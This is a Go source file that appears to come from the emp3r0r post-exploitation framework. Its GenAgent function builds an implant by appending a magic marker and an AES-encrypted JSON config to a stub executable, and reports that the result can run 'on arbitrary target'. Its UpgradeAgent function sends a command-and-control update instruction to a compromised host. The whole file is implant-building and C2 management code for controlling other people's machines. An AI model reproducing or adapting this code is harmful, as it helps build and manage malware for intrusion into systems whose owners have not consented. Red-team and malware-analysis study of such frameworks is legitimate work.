package cc

import (
	"fmt"
	"io/ioutil"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func GenAgent() {
	buildJSONFile := EmpRoot + "/emp3r0r.json"
	stubFile := EmpRoot + "/stub.exe"
	outfile := EmpRoot + "/agent.exe"

	CliPrintInfo("Please anwser a few questions in the new tmux window, come back here when you are done")
	err := TmuxNewWindow("gen-agent", "./build.py --target agent")
	if err != nil {
		CliPrintError("Something went wrong, please check build.py's output")
		return
	}

	// read file
	jsonBytes, err := ioutil.ReadFile(buildJSONFile)
	if err != nil {
		CliPrintError("Parsing emp3r0r JSON config file: %v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encJSONBytes == nil {
		CliPrintError("Failed to encrypt %s with key %s", buildJSONFile, key)
		return
	}

	// write
	toWrite, err := ioutil.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	toWrite = append(toWrite, []byte(emp3r0r_data.MagicString)...)
	toWrite = append(toWrite, encJSONBytes...)
	err = ioutil.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, buildJSONFile, outfile)
}

func UpgradeAgent() {
	if !util.IsFileExist(WWWRoot + "agent") {
		CliPrintError("Make sure %s/agent exists", WWWRoot)
		return
	}
	checksum := tun.SHA256SumFile(WWWRoot + "agent")
	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
}
